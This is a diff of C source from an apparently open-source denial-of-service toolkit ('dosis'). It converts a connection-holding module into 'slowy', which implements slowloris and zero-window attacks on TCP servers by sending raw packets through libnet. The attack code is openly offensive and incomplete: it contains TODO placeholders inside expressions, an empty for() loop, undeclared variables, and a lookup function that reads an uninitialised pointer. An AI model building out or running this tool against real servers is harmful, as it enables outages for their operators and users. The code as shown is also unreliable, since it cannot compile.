@@ -1,7 +1,9 @@
 /*****************************************************************************
- * tcpopen.c
+ * slowy.c
  *
- * DoS on TCP servers by leaving connections opened.
+ * DoS on TCP servers by
+ *  - slowloris attack
+ *  - zero window size
  *
  * ---------------------------------------------------------------------------
  * dosis - DoS: Internet Sodomizer
@@ -28,7 +30,7 @@
 #include "dosis.h"
 #include "dosconfig.h"
 #include "tea.h"
-#include "tcpopen.h"
+#include "slowy.h"
 #include "lnet.h"
 #include "payload.h"
 #include "pthreadex.h"
@@ -37,22 +39,110 @@
 
 #define BUFSIZE    2048
 
-typedef struct _tag_TCPOPEN_CFG {
+typedef struct _tag_TCPCON {
+  int         sport;
+  int         mss;
+
+  int         timeout; /* milis to wait before sending */
+  int         winsize; /* current win size             */
+  unsigned    flags;
+  unsigned    seq;     /* seq                          */
+  unsigned    ack;     /* last acked bytes             */
+  int         offset;  /* current offset               */
+  int         tosend;  /* next bytes to sent           */
+  struct _tag_TCPCON *next;
+} TCP_CON;
+
+typedef struct _tag_SLOWY_CFG {
   INET_ADDR   shost;
   INET_ADDR   dhost;
-  unsigned    npackets;
+  int         mss;
+  int         zerowin;
+  unsigned    timeout;
   char       *payload;
   unsigned    payload_size;
+  TCP_CON    *conns[256];
+  TCP_CON    *fconns;
   LN_CONTEXT *lnc;
-} TCPOPEN_CFG;
+} SLOWY_CFG;
+
+
+/*****************************************************************************
+ * CONN MNGMT
+ *****************************************************************************/
+
+static TCP_CON *conn_new(THREAD_WORK *tw, int sport)
+{
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
+  TCP_CON *c;
+  unsigned i;
+
+  /* alloc new conn (if necessary) */
+  if(tc->fconns)
+  {
+    c = tc->fconns;
+    tc->fconns = c->next;
+  } else
+    if((c = calloc(1, sizeof(TCP_CON))) == NULL)
+      TFAT("No mem for connection.");
+
+  /* initialize */
+  c->sport = sport;
+
+  /* add to conntrack tables */
+  i = ((unsigned) sport) >> 8;
+  if(tc->conns[i] != NULL)
+    c->next = tc->conns[i];
+  tc->conns[i] = c;
+
+  return c;
+}
+
+static TCP_CON *conn_find(THREAD_WORK *tw, int sport)
+{
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
+  TCP_CON *c;
+  unsigned i;
+
+  i = ((unsigned) c->sport) >> 8;
+  for(c = tc->conns[i]; c && c->sport != sport; c = c->next)
+    ;
+
+  return c;
+}
+
+static void conn_release(THREAD_WORK *tw, TCP_CON *c)
+{
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
+  TCP_CON *t;
+  unsigned i;
+
+  /* remove conn from conntrack tables */
+  i = ((unsigned) c->sport) >> 8;
+  if(tc->conns[i] == c)
+  {
+    tc->conns[i] = c->next;
+  } else {
+    for(t = tc->conns[i]; t->next && t->next != c; t = t->next)
+      ;
+    if(t->next == c)
+      t->next = c->next;
+    else
+      TERR("BAD ERROR -- connection %p not found!", c);
+  }
+
+  /* add released conn to released conns table */
+  c->next = tc->fconns;
+  tc->fconns = c;
+}
 
 /*****************************************************************************
  * THREAD IMPLEMENTATION
  *****************************************************************************/
 
-static int tcpopen__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
+static int slowy__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
 
   /* check msg size and headers */
   if(size < sizeof(struct iphdr)
@@ -66,15 +156,16 @@ static int tcpopen__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
          ? -1 : 0;
 }
 
-static void tcpopen__listen(THREAD_WORK *tw)
+static void slowy__listen(THREAD_WORK *tw)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
   TEA_MSG *m;
+  TCP_CON *c;
 
   /* listen the radio */
   while((m = tea_mqueue_shift(tw->mqueue)) != NULL)
   {
-    TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d,syn=%d,ack=%d) => [%08x/%08x] >>",
+    TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
             IP_PROTOCOL(m->b),
             (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
             (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
@@ -82,54 +173,88 @@ static void tcpopen__listen(THREAD_WORK *tw)
             (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
             TCP_HEADER(m->b)->dest, tc->dhost.port,
             TCP_HEADER(m->b)->rst,
-            TCP_HEADER(m->b)->syn,
-            TCP_HEADER(m->b)->ack,
             IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);
 
-    /* in some special case (handshake) send kakitas */
+    /* in some special case (handshake) send kakita */
     if(TCP_HEADER(m->b)->syn != 0
     && TCP_HEADER(m->b)->ack != 0)
     {
-      /* send handshake and data TCP packet */
+      /* register connection */
+      c = conn_new(tw, TCP_HEADER(m->b)->dest);
+
+      /* get mss */
+      c->mss = ln_tcp_get_mss(m->b, m->s);
+
+      /* send handshake */
       ln_send_tcp_packet(tc->lnc,
                          &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                          &tc->dhost.addr.in.inaddr, tc->dhost.port,
                          TH_ACK,
-                         13337, //5840, //ntohs(tcp_header(m->b)->window),
+                         ntohs(TCP_HEADER(m->b)->window),
                          ntohl(TCP_HEADER(m->b)->ack_seq),
                          ntohl(TCP_HEADER(m->b)->seq) + 1,
                          NULL, 0,
                          NULL, 0);
-      ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
-                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                         TH_ACK | TH_PUSH,
-                         13337, //5840, //ntohs(tcp_header(m->b)->window),
-                         ntohl(TCP_HEADER(m->b)->ack_seq),
-                         ntohl(TCP_HEADER(m->b)->seq) + 1,
-                         (char *) tc->payload, tc->payload_size,
-                         NULL, 0);
+
+      /* prepare first request packet to schedule (common for both attacks) */
+      c->offset  = 0;
+      c->seq     = TCP_HEADER(m->b)->ack_seq;
+      c->ack     = TCP_HEADER(m->b)->seq + 1;
+      c->flags   = TH_ACK;
     }
 
-/* XXX WTF XXX */
-#if 0
-    if(tcp_header(m->b)->syn == 0
-    && tcp_header(m->b)->ack == 0)
+    if(TCP_HEADER(m->b)->ack != 0)
     {
-      TDBG2("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX SUZUKI DE SESION");
-      ln_send_tcp_packet(tc->lnc,
-                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
-                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
-                         TH_ACK,
-                         ntohs(tcp_header(m->b)->window),
-                         ntohl(tcp_header(m->b)->ack_seq),
-                         ntohl(tcp_header(m->b)->seq) + 1,
-                         NULL, 0);
+      /* decide how much to send ... */
+      s = tc->zerowin ? c->mss : (rand() & 0x07) + 1;
+
+      /* (both) send data (if there is any available) */
+      if(c->offset + s < tc->payload_size)
+      {
+        c->tosend  = s;
+        c->flags   = TH_ACK;
+      } else {
+        c->tosend  = tc->payload_size - c->offset;
+        c->flags   = TH_ACK | TH_PUSH;
+      }
+
+      /* decide other parameters (depending on attack) */
+      if(tc->zerowin)
+      {
+        /* (zerowin) */
+        c->timeout = 0;
+        c->window  = c->window - XXX; /* XXX TODO XXX */
+      } else {
+        /* (slowloris) */
+        c->timeout = XXX; /* XXX TODO XXX */
+      }
+    } else
+    if(TCP_HEADER(m->b)->fin != 0
+    || TCP_HEADER(m->b)->rst != 0)
+    {
+      /* kill connection */
+      /*   - (fin) schedule fin/ack packet */
+      /*   - (fin&rst) remove directly */
     }
-#endif
 
     /* release msg buffer */
     tea_msg_release(m);
+  }
+
+  /* send scheduled packets */
+  /* XXX TODO XXX */
+  for()
+  {
+    /* send request in one TCP packet */
+    ln_send_tcp_packet(tc->lnc,
+                       &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
+                       &tc->dhost.addr.in.inaddr, tc->dhost.port,
+                       TH_ACK | TH_PUSH,
+                       ntohs(c->window),
+                       ntohl(c->seq),
+                       ntohl(c->ack),
+                       ((char *) tc->payload) + c->offset, c->tosend,
+                       NULL, 0);
   }
 }
 
@@ -140,17 +265,17 @@ static void tcpopen__listen(THREAD_WORK *tw)
  *   configuration and reconfigurations.
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
+static int slowy__configure(THREAD_WORK *tw, SNODE *command)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
   SNODE *cn;
   char *s;
 
   /* initialize specialized work thread data */
   if(tc == NULL)
   {
-    if((tc = calloc(1, sizeof(TCPOPEN_CFG))) == NULL)
-      TFAT("No memory for TCPOPEN_CFG.");
+    if((tc = calloc(1, sizeof(SLOWY_CFG))) == NULL)
+      TFAT("No memory for SLOWY_CFG.");
     tw->data = (void *) tc;
 
     /* initialize libnet */
@@ -162,7 +287,7 @@ static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
   /* read from SNODE command parameters */
   if(command->command.thc.to != NULL)
   if(command->command.thc.to->to.pattern != NULL)
-    TFAT("%d: TCPOPEN does not accept a pattern.",
+    TFAT("%d: SLOWY does not accept a pattern.",
          command->command.thc.to->to.pattern->line);
   
   /* read from SNODE command options */
@@ -228,9 +353,9 @@ static int tcpopen__configure(THREAD_WORK *tw, SNODE *command)
   return 0;
 }
 
-static void tcpopen__cleanup(THREAD_WORK *tw)
+static void slowy__cleanup(THREAD_WORK *tw)
 {
-  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
+  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
 
   if(tc)
   {
@@ -248,6 +373,9 @@ static void tcpopen__cleanup(THREAD_WORK *tw)
     }
     free(tc);
     tw->data = NULL;
+
+    /* free conntrack pool */
+    /* XXX TODO XXX */
   }
   TDBG("Finalized.");
 }
@@ -256,11 +384,11 @@ static void tcpopen__cleanup(THREAD_WORK *tw)
  * TEA OBJECT
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-TEA_OBJECT teaTCPOPEN = {
-  .name         = "TCPOPEN",
-  .configure    = tcpopen__configure,
-  .cleanup      = tcpopen__cleanup,
-  .listen       = tcpopen__listen,
-  .listen_check = tcpopen__listen_check,
+TEA_OBJECT teaSLOWY = {
+  .name         = "SLOWY",
+  .configure    = slowy__configure,
+  .cleanup      = slowy__cleanup,
+  .listen       = slowy__listen,
+  .listen_check = slowy__listen_check,
 };
 
